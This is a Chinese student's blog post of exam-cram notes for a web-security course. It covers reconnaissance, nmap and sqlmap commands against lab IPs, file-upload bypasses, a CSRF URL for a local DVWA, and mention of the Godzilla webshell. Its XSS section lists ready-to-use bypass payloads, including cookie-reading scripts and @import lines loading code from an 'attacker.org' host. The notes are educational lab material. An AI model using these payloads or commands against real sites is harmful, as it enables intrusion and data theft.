+++
title = "网安选修课的期末考前急救"
date = "2021-12-11T19:34:37+08:00"
author = "resyon"
authorTwitter = "" #do not include @
cover = ""
tags = ["security"]
description = "本人应付考试的网安速通缪记"
showFullContent = false
readingTime = false
draft = false
+++

# web-security test

## 试题手写40

### 整个攻击流程（渗透过程）

![image.png](/upload/2021/12/image-6df3aeb93bde491b839d3a8a05c4a944.png)

#### 渗透-信息的收集


> [PPT](https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing)

1. 收集域名信息
- whois
查询域名 注册与否，注册域名的详细信息（如域名所有人、域名注册商）
tools: `whois`(kali), `爱站工具网`(https://whois.aizhan.com)、`站长之家`(http://whois.chinaz.com)和`VirusTotal`(https://www.virustotal.com)
- 备案信息
tools: `ICP备案查询网`：http://www.beianbeian.com, `天眼查`：http://www.tianyancha.com。

2. 收集敏感信息
- 利用搜索引擎，轻松得到想要的信息，还可以用它来搜集数据库文件，SQL注入，配置信息、源代码泄露、未授权访问和rebots.txt等敏感信息
> google 常用语法
> ![image.png](/upload/2021/12/image-b041a8198d7c40109ed3f4c5b8613e6a.png)
- 通过`Burp Suite`的`Repeater`功能，（如运行的Server类型及版本，PHP的版本信息等）

3. 收集子域名信息
> 因为子域名通常护甲较弱

- 子域名检测工具
(eg. Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE)

- 搜索引擎枚举
`site: ${target_domain}`

- 第三方聚合应用枚举
很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域
名。只需在其搜索栏中输入域名，就可检索到相关的域名信息

- 证书透明度公开日志枚举
最简单的方法就是使用搜索引擎搜索一些公开的CT日志

4. 收集常用端口信息

关注常见应用的默认端口和在端口上运行的服务，便于渗透
tools: `Nmap`，无状态端口扫描工具`Masscan`、`ZMap`和`御剑高速TCP端口扫描工具`

5. 指纹识别
指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别
应用程序一般在html、js、css等文件中包含一些特征码(CMS指纹)，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。
CMS又称整站系统或文章系统, 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。

tools: `御剑Web指纹识别`、`WhatWeb`、`WebRobo`、`椰树`、`轻量WEB指纹识别`等

6. 寻找真实ip
- 无CDN: tools: www.ip138.com
- 有CDN: ~~我赌他不考~~

7. 收集敏感目录
8. 社会工程学

  
### OWSP十大安全漏洞

OWASP组织：开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正.实际.有成本效益的信息。其目的是协助个人.企业和机构来发现和使用可信赖软件。
十个漏洞：
1. 注入
2. 失效的身份认证和会话管理
3. 跨站脚本
4. 不安全的直接对象引用
5. 安全配置错误
6. 敏感信息泄露
7. 功能级访问控制缺失
8. 跨站请求伪造
9. 使用含有已知漏洞的组件
10. 未验证的重定向与 转发

### ~~web 及工作原理~~
> [web, php, mysql, etc 网安入门 ppt](https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing)

![image.png](/upload/2021/12/image-2b150c9ecbad4114a85cfddc3f5beda4.png)
![image.png](/upload/2021/12/image-d5537aaf28244053816285b340304493.png)
![image.png](/upload/2021/12/image-6bbd4f4973a4456788762a8ef25d87e7.png)
![image.png](/upload/2021/12/image-2293c0d9f06f40bba5b297d709ab033f.png)
![image.png](/upload/2021/12/image-0418374bc0aa483d9e7d15f1755bef8d.png)
![image.png](/upload/2021/12/image-8afcc2d81e8c410aa5c2b7a5ae050e06.png)
### web框架怎样的结构，哪三层，作用是什么
> ~~下面给的原答案好像有点问题~~
> 说的可能是 [这个](https://developer.aliyun.com/article/45632)
> ![image.png](/upload/2021/12/image-ad5b8643660b40b79d406f882cf68405.png)

web应用->应用服务器->数据库服务器
- web应用：可以通过Web访问的应用程序, eg. WordPress
- 应用程序服务器（英语：application server）是一种软件框架，提供一个应用程序运行的环境。 用于为应用程序提供安全.数据.事务支持.负载平衡大型分布式系统管理等服务。eg. Apache, IIS
- 数据库服务器：是联系Web服务器与数据库管理系统（DBMS）的中间件是负责处理所有的应用程序服务器，包括在web服务器和后台的应用程序或数据库之间的事务处理和数据访问。eg...

### 三个工具主要功能，简单操作要会
#### burpsuite
> [ppt](https://docs.google.com/presentation/d/1Ps-miNR8luOUMqi36Co4uaY9DTZM3BFVsEEwLLN8KKY/edit?usp=sharing)

> [ref](https://zh.wikipedia.org/wiki/Burp_suite)

用于测试网络应用程序安全性的图形化工具(java)

- HTTP Proxy — 拦截、查看、修改所有在客户端与服务端之间传输的数据。(他就是个拦截，指道的，发挥其他功能要靠下面的模块)
- ~~Scanner~~ — Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。
- Intruder — 对 Web 应用程序执行自动攻击。提供可配置算法，可生成恶意 HTTP 请求。Intruder 工具可以测试和检测 SQL 注入、跨站脚本、参数篡改和易暴力攻击的漏洞。
- ~~Spider~~ — 自动抓取 Web 应用程序的工具。可以与手工映射技术一起使用，加快映射应用程序内容和功能的过程。
- Repeater — 用来手动测试应用程序的简单工具。用于修改对服务器的请求，重新发送并观察结果。它最大的用途就是能和其他 Burp Suite工具结合起来使用。可以将目标站点地图、 Burp Proxy/浏览记录、 Burp Intruder的攻击结果，发送到 Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。
- ~~Decoder~~ — 将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。能够利用启发式技术智能识别多种编码格式。
- ~~Comparer~~ — 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。
- ~~Extender~~ — 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能
- ~~Sequencer~~ — 分析数据项样本随机性的工具。可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。


#### nmap
Nmap( Network Mapper,网络映射器), `网络探测`和`安全审核`工具。用来`快速扫描大型网络`，包括`主机探测与发现`、`开放的端口情况`、操作系统与应用服务`指纹识别`、WAF识别及常见安全漏洞。~~它的图形化界面是Zenmap,分布式框架为Dmap。~~
特点：
- 主机探测：探则网络上的主机，如列出响应TCP和CMP请求、ICMP请求、开放特别端口的主机
- 端口扫描：探测目标主机所开放的端口
- 版本检测：探测目标主机的网络服务，判断其服务名称及版本号
- 系统检测：探测目标主机的操作系统及网络设备的硬件特性
- 支持探测脚本的编写：使用Nmap的脚本引擎(NSE)和lua编程语言。

使用：
```bash
# 扫主机
nmap 192.168.1.105 192.168.1.106 # 1个或多个

nmap 192.168.1.105-106 # 和上面一样

nmap 192.168.1.0/24 # 团灭整个网段

nmap --li /tmp/file --exclude 192.168.1.105 --excludefile /tmp/file1 # 扫`file`整个文件, 除了`192.168.1.105`和文件`file1`里头的

# 路由跟踪
nmap --traceroute 192.168.1.105 

# 扫端口
nmap 192.168.0.100 –p 21,22,23,80

# 扫在线状况
nmap –sP 192.168.0.100/24 

# 操作系统指纹识别
nmap –O 192.168.0.105 # 识别操作系统的版本

# 服务版本检测
nmap -sV 192.168.0.105 # 检测开放端口对应的服务版本信息

# 探测防火墙状态  
nmap -sF -T4 192.168.0.105 # FIN扫描用于识别端口是否关闭，RST: 端口关闭，否则是open或 filtered状态.

```

![image.png](/upload/2021/12/image-2b222cb254a2483eac14c1d169a5f093.png)


#### sqlmap
> [ppt](https://docs.google.com/presentation/d/1RTnsCI0q02FCXouj4AYTvYbsAS-vo97keWnRdWRe-pQ/edit?usp=sharing)

![image.png](/upload/2021/12/image-4b322e227b804a6cbd763c0f357ee550.png)


使用
```bash
# 扫单个url, url都加双引号就对了
sqlmap.py -u "http://192.168.1.104/sql1/Less-1/?id=1&uid=2"

# 扫文件里的
sqlmap.py -r desktop/1.txt

# show databases;
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --dbs

# use security; show tables;
sqlmap.py -u http://127.0.0.1/sql/Less-1?id=1 -D security --tables 

# desc security.users;
sqlmap.py -u "http://127.0.0.1/sql/Less-1/?id=1" -D security -T users --columns

# select * from security.users; 
sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id=1” -D security -T users  --dump

# 获取数据库的所有用户
sqlmap.py -u "http://127.0.0.1/sql/Less-1/?id=1" -users

# 获取当前网站数据库的名称
sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id=1” --current-db

# 获取当前网站数据库的用户名称
sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id=1” --current-user

```


## 实操

### SQL注入
> [ppt](https://docs.google.com/presentation/d/1BoP8zCuAYZvGmVxFBFtKwGdJB29VHF9RfnkThf-WDoM/edit?usp=sharing)

SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

SQL注入漏洞的产生需要满足以下两个条件：
1、参数用户可控：前端传给后端的参数内容是用户可以控制的。
2、参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询

#### 考点
虚拟机下完成union boolean 报错注入
![image.png](/upload/2021/12/image-81e503bcb28b41128b1162536612347e.png)
![image.png](/upload/2021/12/image-5a6640925c8c4076a3049f7b750a909f.png)


### 文件上传 
> [ppt](https://docs.google.com/presentation/d/1XUfC7W_sLhVOxO8n_CksYJIxchn31_TatbjwG_JTHKk/edit?usp=sharing)

利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站的权限，或者进一步危害服务器

#### js绕过
原因：这种情况只是对`http head`中的`Content-Type`字段进行限制
方案：此时只需要使用`burpsuite`啥的把Content-Type改了

#### 图马绕过
原因：服务端对文件进行了检测
方案：~~他没给，肯定不考~~

#### 考点
文件上传--js检测绕过漏洞
文件后缀(改名)
文件类型绕过(burpsuite改Content-Type)

### 暴力破解 
[ppt](https://docs.google.com/presentation/d/1Bs7VGNWOsRhZp1QTU4QG48VBut20a86tOY1KfSuNy2M/edit?usp=sharing)

### XSS 
在Web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击一将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。
XSS的基本实现思路很简单：比如持久型XSS通过一些正常的站内交互途径，例如发布评论，提交含有Javascript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。

#### 考点
1. XSS反射型/存储型
方法一:用`<img>`标签代替`<script>`
`<img src=1 onerror=alert('xss')>`
方法二:双写绕过`<s<script>cript>alert('xss')</script>`
方法三:大小写绕过
`<ScRipt>alert('xss')</ScRipt>` 

2. DOM型
`?default=<script>alert(document.cookie)</script>`


上面不行，试试下面的

```
第一类：Javascript URL

<a href="javascript:alert('test')">link</a>

<a href="java&#115;cript:alert('xss')">link</a>

<iframe src=javascript:alert('xss')>

第二类：Inline style

<div style="color: expression(alert('XSS'))">

<div style=color:expression\(alert(1))></div>

第三类：JavaScript 事件

<img src=1 onclick=alert('xss')>

<img src=1 onerror=alert('xss')>

<body onload=alert('xss')>

第四类：Script标签

<script>alert('xss')</script> <script>alert(document.cookie)</script>

<script>window.location='http://www.163.com'</script>

<scr<script>ipt>alert('XSS')</scr<script>ipt>

<SCRIPT>alert('xss')</SCRIPT>

第五类：CSS import

<style>@import url("http://attacker.org/malicious.css");</style>

<style>@imp\ort url("http://attacker.org/malicious.css");</style>

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<STYLE>@import'http://jb51.net/xss.css';</STYLE>
```




### CSRF  原理

CSRF( Cross- site request forgery,跨站请求伪造)也被称为 One ClickAttackt或者 Session Riding,通常缩写为CSRF或者XSRF,是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS),但它与XSs非常不同，XSS利用站点内的信任用户而CSRF通过你装成受信任用户请求受信任的网站。与XSS攻击相比CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更具危险性。



攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全。

#### 考点
虚拟机下CSRF攻击
1. 简单的话
构建响应的url，
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=45&password_conf=45&Change=Change#
在本浏览器新建页面后进去构建好的url，页面显示密码修改成功。

2. 中等的话
![image.png](/upload/2021/12/image-5176172a38b24276947c3a14945a2a64.png)
![image.png](/upload/2021/12/image-0deae3d355b0474c809a8a2e5e3dc52c.png)


## 杂项

哥斯拉木马的使用，远程控制，远程控制机上上传文件生成一个用户

Php代码理解，分析漏洞


1. 网络安全形式
（通过什么方法防范什么问题达到什么效果）通过采取必要措施，防范对网络的攻击、入侵、干扰、破坏和非法使用以及意外事故，使网络处于可靠运行的状态，以及保障网络的存储，传输，处理信息的完整性，保密性，可用性的能力。
网络安全：网络运行（服务器崩溃）+网络信息安全
2. 网络安全渗透  攻击  网页篡改  远程攻击
渗透过程（流程图会画）
踩点  提权
检索方式:site inurl   
3. 网络安全  渗透工程师  职业
4. 开发  大数据
5. SQL注入  Union boolean  报错信息
Union  函数  -版本号（目的：漏洞  利用）
Boolean  --(yes/no) 枚举  报错信息 
6. 登录  查询
7. SQL语句  标准  常规  异类
8. 库、表、字段---> 管理  系统表 --> 加密存储
9. 工具
bs  
sqlmap
nmap
10. bs---proxy代理（浏览器）  发出请求  响应response  扫描scanner   
   拦截  篡改  钓鱼  代理
暴力破解（密码字典  原理   工具）
11. html静态 交互
部署   php使用---数据库增删改查IDUS   服务(sqldemo） index.php
12. xss
 js  php
交互   对话框 
反射型  存储型  脚本  执行
dom型  
13. 文件上传  
14. 哥斯拉---做木马  php
绕过 Js
文件类型  绕过
文件后缀  绕过
远程控制
15. IP端口  URL   --->网络
16. 靶机  物理机  （必考）
17. test.sql上传数据库  导入数据
18. CSRF
19. KALI   msf   ms 
